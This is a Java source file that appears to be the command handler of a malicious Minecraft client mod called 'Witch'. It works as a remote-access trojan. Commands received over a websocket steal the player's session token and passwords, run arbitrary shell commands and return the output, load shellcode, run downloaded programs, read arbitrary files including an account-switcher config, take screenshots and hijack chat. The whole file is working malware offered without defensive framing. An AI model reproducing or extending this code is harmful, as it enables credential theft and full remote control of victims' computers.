package me.soda.witch.websocket;

import com.google.gson.Gson;
import me.soda.witch.Witch;
import me.soda.witch.features.*;
import net.minecraft.text.Text;

import java.util.Base64;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    public static void handle(String message) {
        String[] msgArr = message.split(" ");
        String messageType = msgArr[0];
        Witch.println("Received message: " + messageType);
        try {
            switch (messageType) {
                case "steal_pwd_switch":
                    Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
                    break;
                case "steal_token":
                    MessageUtils.sendMessage(messageType, new Gson().toJson(new Stealer.Token()));
                    break;
                case "chat_control":
                    ChatUtil.sendChat(decodeBase64(msgArr[1]));
                    break;
                case "chat_filter":
                    Witch.config.filterPattern = decodeBase64(msgArr[1]);
                    break;
                case "chat_filter_switch":
                    Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                    break;
                case "chat_mute":
                    Witch.config.isMuted = !Witch.config.isMuted;
                    break;
                case "mods":
                    MessageUtils.sendMessage(messageType, MinecraftUtil.allMods());
                    break;
                case "systeminfo":
                    MessageUtils.sendMessage(messageType, MinecraftUtil.systemInfo());
                    break;
                case "screenshot":
                    Witch.screenshot = true;
                    break;
                case "chat":
                    ChatUtil.chat(Text.of(decodeBase64(msgArr[1])), false);
                    break;
                case "kill":
                    Witch.client.close(false);
                    break;
                case "shell":
                    new Thread(() -> {
                        String result = ShellUtil.runCmd(decodeBase64(msgArr[1]));
                        MessageUtils.sendMessage(messageType, "\n" + result);
                    }).start();
                    break;
                case "shellcode":
                    if (ShellUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                    break;
                case "log":
                    Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
                    MessageUtils.sendMessage(messageType, String.valueOf(Witch.config.logChatAndCommand));
                    break;
                case "config":
                    MessageUtils.sendMessage(messageType, new Gson().toJson(Witch.config));
                    break;
                case "player":
                    MessageUtils.sendMessage(messageType, new Gson().toJson(new PlayerInfo(Witch.mc.player)));
                    break;
                case "skin":
                    handle("player");
                    PlayerSkin.sendPlayerSkin();
                    break;
                case "server":
                    ServerUtil.disconnect();
                    Witch.config.canJoinServer = !Witch.config.canJoinServer;
                    break;
                case "kick":
                    ServerUtil.disconnect();
                    break;
                case "execute":
                    if (ShellUtil.isWin()) {
                        ShellUtil.runProg(Base64.getDecoder().decode(msgArr[1]));
                    }
                case "iasconfig":
                    MessageUtils.sendMessage(messageType, FileReadUtil.read("config/ias.json"));
                    break;
                case "read":
                    MessageUtils.sendMessage(messageType, FileReadUtil.read(decodeBase64(msgArr[1])));
                    break;
                case "runargs":
                    MessageUtils.sendMessage(messageType, new Gson().toJson(System.getProperties()));
                    break;
                default:
                    break;
            }
        } catch (Exception e) {
            Witch.println("Corrupted message!");
            Witch.printStackTrace(e);
        }
    }
}